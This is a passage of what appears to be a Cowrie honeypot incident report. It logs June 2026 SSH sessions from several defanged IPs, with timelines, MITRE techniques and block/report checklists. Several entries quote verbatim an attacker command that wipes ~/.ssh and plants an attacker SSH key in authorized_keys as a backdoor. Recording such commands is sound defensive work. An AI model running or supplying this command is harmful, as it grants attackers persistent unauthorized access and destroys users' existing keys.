| `2026-06-10 08:35:27` | `cowrie.command.failed` |
| `2026-06-10 08:35:27` | `cowrie.log.closed` |
| `2026-06-10 08:35:27` | `cowrie.session.params` |
| `2026-06-10 08:35:28` | `cowrie.command.input` |
| `2026-06-10 08:35:28` | `cowrie.session.file_download` |
| `2026-06-10 08:35:28` | `cowrie.log.closed` |
| `2026-06-10 08:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd6c4e9e512

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:35 |
| **Last Seen** | 2026-06-10 08:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:35:30` | `cowrie.session.connect` |
| `2026-06-10 08:35:30` | `cowrie.client.version` |
| `2026-06-10 08:35:30` | `cowrie.client.kex` |
| `2026-06-10 08:35:31` | `cowrie.login.success` |
| `2026-06-10 08:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-476cd1095f01

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:37 |
| **Last Seen** | 2026-06-10 08:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:37:34` | `cowrie.session.connect` |
| `2026-06-10 08:37:34` | `cowrie.client.version` |
| `2026-06-10 08:37:34` | `cowrie.client.kex` |
| `2026-06-10 08:37:35` | `cowrie.login.success` |
| `2026-06-10 08:37:36` | `cowrie.session.params` |
| `2026-06-10 08:37:36` | `cowrie.command.input` |
| `2026-06-10 08:37:36` | `cowrie.command.failed` |
| `2026-06-10 08:37:36` | `cowrie.log.closed` |
| `2026-06-10 08:37:36` | `cowrie.session.params` |
| `2026-06-10 08:37:36` | `cowrie.command.input` |
| `2026-06-10 08:37:36` | `cowrie.session.file_download` |
| `2026-06-10 08:37:36` | `cowrie.log.closed` |
| `2026-06-10 08:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d066c0756317

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:37 |
| **Last Seen** | 2026-06-10 08:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:37:39` | `cowrie.session.connect` |
| `2026-06-10 08:37:39` | `cowrie.client.version` |
| `2026-06-10 08:37:39` | `cowrie.client.kex` |
| `2026-06-10 08:37:40` | `cowrie.login.success` |
| `2026-06-10 08:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76338e0e198f

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:39 |
| **Last Seen** | 2026-06-10 08:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:39:12` | `cowrie.session.connect` |
| `2026-06-10 08:39:12` | `cowrie.client.version` |
| `2026-06-10 08:39:12` | `cowrie.client.kex` |
| `2026-06-10 08:39:13` | `cowrie.login.success` |
| `2026-06-10 08:39:13` | `cowrie.session.params` |
| `2026-06-10 08:39:13` | `cowrie.command.input` |
| `2026-06-10 08:39:13` | `cowrie.command.failed` |
| `2026-06-10 08:39:14` | `cowrie.log.closed` |
| `2026-06-10 08:39:14` | `cowrie.session.params` |
| `2026-06-10 08:39:14` | `cowrie.command.input` |
| `2026-06-10 08:39:14` | `cowrie.session.file_download` |
| `2026-06-10 08:39:14` | `cowrie.log.closed` |
| `2026-06-10 08:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e5d336523d1

| Field | Detail |
|---|---|
| **Source IP** | `157.245.1[.]7` |
| **First Seen** | 2026-06-10 08:39 |
| **Last Seen** | 2026-06-10 08:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:39:17` | `cowrie.session.connect` |
| `2026-06-10 08:39:17` | `cowrie.client.version` |
| `2026-06-10 08:39:17` | `cowrie.client.kex` |
| `2026-06-10 08:39:18` | `cowrie.login.success` |
| `2026-06-10 08:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.1[.]7` to AbuseIPDB if not already reported
- [ ] Block `157.245.1[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77139b4f35e5

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-06-10 08:40 |
| **Last Seen** | 2026-06-10 08:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:40:16` | `cowrie.session.connect` |
| `2026-06-10 08:40:16` | `cowrie.client.version` |
| `2026-06-10 08:40:17` | `cowrie.client.kex` |
| `2026-06-10 08:40:17` | `cowrie.login.success` |
| `2026-06-10 08:40:18` | `cowrie.session.params` |
| `2026-06-10 08:40:18` | `cowrie.command.input` |
| `2026-06-10 08:40:18` | `cowrie.command.failed` |
| `2026-06-10 08:40:18` | `cowrie.log.closed` |
| `2026-06-10 08:40:18` | `cowrie.session.params` |
| `2026-06-10 08:40:18` | `cowrie.command.input` |
| `2026-06-10 08:40:18` | `cowrie.session.file_download` |
| `2026-06-10 08:40:18` | `cowrie.log.closed` |
| `2026-06-10 08:40:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ee4df9905b2

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-06-10 08:40 |
| **Last Seen** | 2026-06-10 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:40:21` | `cowrie.session.connect` |
| `2026-06-10 08:40:21` | `cowrie.client.version` |
| `2026-06-10 08:40:21` | `cowrie.client.kex` |
| `2026-06-10 08:40:22` | `cowrie.login.success` |
| `2026-06-10 08:40:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c649b584f258

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]172` |
| **First Seen** | 2026-06-10 08:43 |
| **Last Seen** | 2026-06-10 08:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:43:10` | `cowrie.session.connect` |
| `2026-06-10 08:43:10` | `cowrie.client.version` |
| `2026-06-10 08:43:10` | `cowrie.client.kex` |
| `2026-06-10 08:43:11` | `cowrie.login.success` |
| `2026-06-10 08:43:11` | `cowrie.session.params` |
| `2026-06-10 08:43:11` | `cowrie.command.input` |
| `2026-06-10 08:43:11` | `cowrie.command.failed` |
| `2026-06-10 08:43:11` | `cowrie.log.closed` |
| `2026-06-10 08:43:11` | `cowrie.session.params` |
| `2026-06-10 08:43:11` | `cowrie.command.input` |
| `2026-06-10 08:43:11` | `cowrie.session.file_download` |
| `2026-06-10 08:43:11` | `cowrie.log.closed` |
| `2026-06-10 08:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]172` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3863151e067c

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]172` |
| **First Seen** | 2026-06-10 08:43 |
| **Last Seen** | 2026-06-10 08:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:43:13` | `cowrie.session.connect` |
| `2026-06-10 08:43:13` | `cowrie.client.version` |
| `2026-06-10 08:43:14` | `cowrie.client.kex` |
| `2026-06-10 08:43:14` | `cowrie.login.success` |
| `2026-06-10 08:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]172` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2f4f3273877

| Field | Detail |
|---|---|
| **Source IP** | `108.167.177[.]224` |
| **First Seen** | 2026-06-10 08:46 |
| **Last Seen** | 2026-06-10 08:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:46:05` | `cowrie.session.connect` |
| `2026-06-10 08:46:05` | `cowrie.client.version` |
| `2026-06-10 08:46:05` | `cowrie.client.kex` |
| `2026-06-10 08:46:06` | `cowrie.login.success` |
| `2026-06-10 08:46:07` | `cowrie.session.params` |
| `2026-06-10 08:46:07` | `cowrie.command.input` |
| `2026-06-10 08:46:07` | `cowrie.command.failed` |
| `2026-06-10 08:46:07` | `cowrie.log.closed` |
| `2026-06-10 08:46:07` | `cowrie.session.params` |
| `2026-06-10 08:46:07` | `cowrie.command.input` |
| `2026-06-10 08:46:08` | `cowrie.session.file_download` |
| `2026-06-10 08:46:08` | `cowrie.log.closed` |
| `2026-06-10 08:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.167.177[.]224` to AbuseIPDB if not already reported
- [ ] Block `108.167.177[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b73441d719d7

| Field | Detail |
|---|---|
| **Source IP** | `108.167.177[.]224` |
| **First Seen** | 2026-06-10 08:46 |
| **Last Seen** | 2026-06-10 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:46:11` | `cowrie.session.connect` |
| `2026-06-10 08:46:11` | `cowrie.client.version` |
| `2026-06-10 08:46:11` | `cowrie.client.kex` |
| `2026-06-10 08:46:12` | `cowrie.login.success` |
| `2026-06-10 08:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.167.177[.]224` to AbuseIPDB if not already reported
- [ ] Block `108.167.177[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b14047f875b9

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:50 |
| **Last Seen** | 2026-06-10 08:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:50:40` | `cowrie.session.connect` |
| `2026-06-10 08:50:40` | `cowrie.client.version` |
| `2026-06-10 08:50:40` | `cowrie.client.kex` |
| `2026-06-10 08:50:41` | `cowrie.login.success` |
| `2026-06-10 08:50:41` | `cowrie.session.params` |
| `2026-06-10 08:50:41` | `cowrie.command.input` |
| `2026-06-10 08:50:41` | `cowrie.command.failed` |
| `2026-06-10 08:50:41` | `cowrie.log.closed` |
| `2026-06-10 08:50:41` | `cowrie.session.params` |
| `2026-06-10 08:50:41` | `cowrie.command.input` |
| `2026-06-10 08:50:42` | `cowrie.session.file_download` |
| `2026-06-10 08:50:42` | `cowrie.log.closed` |
| `2026-06-10 08:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6a6b6f31660

| Field | Detail |
|---|---|
| **Source IP** | `204.168.240[.]142` |
| **First Seen** | 2026-06-10 08:50 |
| **Last Seen** | 2026-06-10 08:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:50:44` | `cowrie.session.connect` |
| `2026-06-10 08:50:44` | `cowrie.client.version` |
| `2026-06-10 08:50:44` | `cowrie.client.kex` |
| `2026-06-10 08:50:44` | `cowrie.login.success` |
| `2026-06-10 08:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.168.240[.]142` to AbuseIPDB if not already reported
- [ ] Block `204.168.240[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b39cb49ef01

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-06-10 08:50 |
| **Last Seen** | 2026-06-10 08:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:50:49` | `cowrie.session.connect` |
| `2026-06-10 08:50:49` | `cowrie.client.version` |
| `2026-06-10 08:50:49` | `cowrie.client.kex` |
| `2026-06-10 08:50:50` | `cowrie.login.success` |
| `2026-06-10 08:50:50` | `cowrie.session.params` |
| `2026-06-10 08:50:50` | `cowrie.command.input` |
| `2026-06-10 08:50:50` | `cowrie.command.failed` |
| `2026-06-10 08:50:50` | `cowrie.log.closed` |
| `2026-06-10 08:50:51` | `cowrie.session.params` |
| `2026-06-10 08:50:51` | `cowrie.command.input` |
| `2026-06-10 08:50:51` | `cowrie.session.file_download` |
| `2026-06-10 08:50:51` | `cowrie.log.closed` |
| `2026-06-10 08:50:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0db5282feee5

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-06-10 08:50 |
| **Last Seen** | 2026-06-10 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:50:53` | `cowrie.session.connect` |
| `2026-06-10 08:50:53` | `cowrie.client.version` |
| `2026-06-10 08:50:53` | `cowrie.client.kex` |
| `2026-06-10 08:50:54` | `cowrie.login.success` |
| `2026-06-10 08:50:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a6d4eaead3e

| Field | Detail |
|---|---|
| **Source IP** | `41.82.50[.]218` |
| **First Seen** | 2026-06-10 08:51 |
| **Last Seen** | 2026-06-10 08:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:51:51` | `cowrie.session.connect` |
| `2026-06-10 08:51:51` | `cowrie.client.version` |
| `2026-06-10 08:51:51` | `cowrie.client.kex` |
| `2026-06-10 08:51:51` | `cowrie.login.success` |
| `2026-06-10 08:51:52` | `cowrie.session.params` |
| `2026-06-10 08:51:52` | `cowrie.command.input` |
| `2026-06-10 08:51:52` | `cowrie.command.failed` |
| `2026-06-10 08:51:52` | `cowrie.log.closed` |
| `2026-06-10 08:51:53` | `cowrie.session.params` |
| `2026-06-10 08:51:53` | `cowrie.command.input` |
| `2026-06-10 08:51:53` | `cowrie.session.file_download` |
| `2026-06-10 08:51:53` | `cowrie.log.closed` |
| `2026-06-10 08:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.82.50[.]218` to AbuseIPDB if not already reported
- [ ] Block `41.82.50[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60b23bb17ec0

| Field | Detail |
|---|---|
| **Source IP** | `41.82.50[.]218` |
| **First Seen** | 2026-06-10 08:51 |
| **Last Seen** | 2026-06-10 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:51:55` | `cowrie.session.connect` |
| `2026-06-10 08:51:55` | `cowrie.client.version` |
| `2026-06-10 08:51:55` | `cowrie.client.kex` |
| `2026-06-10 08:51:56` | `cowrie.login.success` |
| `2026-06-10 08:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.82.50[.]218` to AbuseIPDB if not already reported
- [ ] Block `41.82.50[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c04702e6f030

| Field | Detail |
